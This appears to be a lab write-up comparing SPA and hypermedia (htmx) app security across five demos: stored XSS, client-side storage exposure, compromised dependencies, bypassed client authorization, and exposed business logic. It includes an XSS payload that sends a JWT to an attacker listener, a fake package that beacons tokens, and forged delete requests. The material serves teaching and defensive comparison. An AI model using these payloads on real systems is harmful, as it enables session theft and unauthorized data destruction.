# The five demos — reproduction & observed results

Each demo fires the **same attack** at both apps. The verdict column is the
*observed* outcome, not an assumption — including where HDA does **not** help.

Prep for every demo: start the attacker listener, both backends, and the SPA
frontend (see [README.md](README.md)). Log in with `alice` / `alice123` (member)
unless a step says otherwise.

A note on the comparison: the SPA-vs-HDA difference is partly **architectural**
and partly a **confound** — the SPA stores a JWT in `localStorage` while the HDA
uses an HttpOnly cookie. That storage choice is idiomatic for each style, but it
means some of the delta below comes from *where the credential lives*, not from
hypermedia itself. Each demo flags which is which.

---

## 1. XSS (stored, via a task description)

Task descriptions are rendered as rich text, so the description field is the
injection sink.

**Payload** (paste as a task description in either app):
```html
<img src=x onerror="fetch('http://localhost:5999/steal?t='+localStorage.token)">
```

**SPA** — `TaskItem.vue` renders the description with `v-html`:
1. Create a task with the payload as its description.
2. Reload / view the task list.
3. The attacker listener prints a `STOLEN` line containing the JWT.

> Observed: **fires.** Vue escapes `{{ }}` by default, but `v-html` opts out —
> and rich-text UIs reach for it constantly. The script runs with full page
> privilege and reads the token straight out of `localStorage`.

**HDA** — rendering depends on `HDA_XSS_MODE` (restart the app to switch):

| mode | how the server renders | result |
|------|------------------------|--------|
| `escape` (default) | `{{ description }}` Jinja auto-escape | **inert** — shown as literal text |
| `raw` | `{{ description \| safe }}` | **XSS fires** |
| `sanitize` | `bleach.clean(...)` allow-list | **inert** — tags stripped |

Verified: in `escape` the payload appears as `&lt;img …&gt;`; in `raw` a live
`<img onerror>` is in the DOM; in `sanitize` the `onerror` attribute is gone.

> Observed: HDA is **not automatically safe**. Default server-side auto-escaping
> stops it, but a developer who wants rich text and reaches for `| safe` (or
> renders un-sanitized Markdown) is just as vulnerable.
>
> The real difference is **impact**: even in `raw` mode, `localStorage.token` is
> `undefined` and the session cookie is HttpOnly, so this exact payload steals
> nothing. To exfiltrate from HDA the attacker must escalate (e.g. drive htmx
> actions via the victim's session) rather than grab a bearer token.

**Verdict:** injection is a coding-discipline issue on both sides
(escape-by-default helps HDA at the margin). The credential-theft impact gap is
mostly the **storage confound**, not hypermedia per se — an SPA using an
HttpOnly cookie would also deny the token grab.

---

## 2. Sensitive data exposure through client-side storage

**SPA:**
1. Log in, open DevTools → Application → Local Storage → `localhost:5173`.
   `token` and `user` are sitting there in the clear.
2. DevTools → Network → the `GET /api/tasks` response. As **alice** you receive
   **every task from every user**, including `internal_notes` (e.g. *"Budget
   approved: $4k"*, *"Incident INC-2231…"*) that the UI never displays.
3. The full set also lives in the Pinia store (`tasks.all`) in memory.

> Observed: the token is JS-readable and the API over-shares. The UI's
> "my tasks" view and hidden columns are cosmetic — the data is all on the
> client. Verified via curl: `GET /api/tasks` returns all 6 tasks + `internal_notes`.

**HDA:**
1. DevTools → Application → Local Storage → empty.
2. Application → Cookies → the session cookie shows **HttpOnly ✓**;
   `document.cookie` in the console returns `""`.
3. View-source of `/`: as **alice** only her 5 tasks are present and there is
   **no `internal_notes`** anywhere in the HTML.

> Observed: verified via curl — HttpOnly cookie set, member receives 5/6 tasks,
> zero `internal_notes` strings in the HTML. The server sends only what it
> renders. Residual risk to check for: hidden inputs, `data-*` attributes, HTML
> comments — this app leaks none, but HDA *can* if you dump extra data into markup.

**Verdict:** a real gap, but partly the **storage confound** (cookie vs
localStorage) and partly **architectural** (server-side filtering vs an
over-fetching JSON API the client filters). The over-fetch is an API-design sin
an SPA doesn't *have* to commit — but the JSON-API style nudges toward it.

---

## 3. Third-party script / dependency compromise

A fake package, `shared/malicious-pkg/` (`analytics-lite`), plays the compromised
dependency.

**SPA** (bundled dependency):
1. In `spa/frontend/src/main.js`, uncomment `import { track } from 'analytics-lite'`.
2. Restart `npm run dev`, log in.
3. The dependency reads `localStorage.token` and beacons it; the attacker
   listener prints a `BEACON` line: *"SPA compromised-dep stole token: …"*.

> Observed: the dep is same-origin, same-bundle, full privilege. It steals the
> token with three lines of code. `npm run build` shows it riding inside the
> shipped JS.

**HDA** (third-party `<script>`):
1. In `hda/backend/templates/base.html`, uncomment
   `<script src="/static/malicious.js"></script>`.
2. Reload http://localhost:5002.
3. The listener prints: *"HDA third-party script sees → cookie=[] localStorage={}"*.

> Observed: the script **still runs** and can read visible DOM content — but the
> HttpOnly cookie is absent from `document.cookie` and `localStorage` is empty,
> so it captures nothing useful.

**Verdict:** HDA **reduces** this risk in two real, architectural ways — a far
smaller client-JS surface (one file, htmx) and no JS-readable credential — and
CSP is easier to lock down with ~one script. It does **not eliminate** it: any
`<script>` you add can still read rendered content, log keystrokes, or drive htmx
requests as the user. "Less JS" is a smaller attack surface, not no attack surface.

---

## 4. Monitoring & detection of client-side changes / data access

**SPA** — the client decides what's allowed:
1. Log in as **alice** (member). The `Delete` button is hidden (it's
   `v-if="auth.isAdmin"`).
2. But nothing stops the call. In DevTools console:
   ```js
   fetch('http://localhost:5001/api/tasks/2', {
     method: 'DELETE',
     headers: { Authorization: 'Bearer ' + localStorage.token }
   })
   ```
3. The task is deleted. The server enforced no ownership/role check
   (`delete_task` in `spa/backend/app.py`).
4. Client-side filtering/routing means the server never saw which tasks alice
   *viewed* — only the calls she chose to make.

> Observed: verified server-side — the DELETE endpoint has no authz. The client
> guard is theatre; the server can neither prevent nor meaningfully audit intent.

**HDA** — the server is in the loop on every action:
1. Log in as **alice**. Forge the same delete:
   ```bash
   curl -b <alice-cookie> -X POST http://localhost:5002/tasks/2/delete
   ```
2. Response is **403**; server log shows
   `REJECTED delete of task 2: alice is not admin`.
3. As admin the same action succeeds and is logged
   (`delete task 4 requested by admin`).

> Observed: verified via curl — member forge → 403 + WARNING log; admin → 200 +
> INFO log; `advance` also logged. Every state-changing action is a server
> round-trip, so it is enforceable *and* auditable in one place.

**Verdict:** **architectural**, and a genuine HDA strength — because interactions
are server round-trips, authorization and audit live server-side by construction.
Caveat: this is only a win if you *use* it. An HDA that trusts a hidden field or
a disabled control is equally bypassable; hypermedia puts the server in the loop,
it doesn't validate for you.

---

## 5. Exposure of client-side business logic & proprietary info

The specimen is the priority-scoring algorithm (status weights, age curve,
unassigned penalty).

**SPA** — logic ships to the browser (`src/lib/priority.js`):
1. `cd spa/frontend && npm run build`.
2. Grep the built bundle:
   ```bash
   grep -o "todo:[0-9]*,in_progress:[0-9]*,blocked:[0-9]*" dist/assets/*.js
   ```
   → `todo:10,in_progress:30,blocked:50`.
3. Also: DevTools → Network enumerates the full JSON API + schema.

> Observed: verified — the scoring weights are recoverable from the minified
> bundle. Minification is not protection; the algorithm and data model are public.

**HDA** — logic stays server-side (`hda/backend/priority.py`):
1. View-source of `/`. You see the *result* — `<span class="badge urgent">` —
   and htmx attributes, but no weights, no formula.
2. `grep -R "STATUS_WEIGHT\|30\|blocked:" ` over what the browser received finds
   nothing.

> Observed: the browser gets computed output only. The formula never leaves the
> server.

**Verdict:** **architectural.** Server-rendered HTML exposes results, not logic.
Residual surface to acknowledge: htmx attributes reveal endpoint URLs
(`/tasks/<id>/advance`, `/delete`), and any logic you *do* embed in markup is
still visible — but the core algorithm genuinely never ships.

---

## Summary

| # | Issue | SPA | HDA | Nature of the gap |
|---|-------|-----|-----|-------------------|
| 1 | Stored XSS | fires, steals token | injectable too (`raw`/markdown); token theft blocked | discipline + **storage confound** |
| 2 | Client storage exposure | token + over-fetched data on client | HttpOnly cookie, server-filtered HTML | **confound** + API design |
| 3 | Dependency compromise | full-privilege token theft | runs, but no useful loot; smaller surface | **architectural** (reduced, not zero) |
| 4 | Monitoring / detection | client guards bypassable, server blind | server enforces + logs every action | **architectural** (if used) |
| 5 | Business-logic exposure | algorithm shipped in bundle | only results in HTML | **architectural** |

**Honest takeaway:** HDA's wins on 3–5 are real and structural — smaller JS
surface, server-in-the-loop, logic stays server-side. Its edge on 1–2 is thinner
than it looks: server-side auto-escaping helps at the margin, but the big impact
difference rides on the HttpOnly-cookie vs localStorage-JWT choice, which an SPA
could also adopt. HDA changes the *defaults and the blast radius*; it does not
make an app secure by itself.
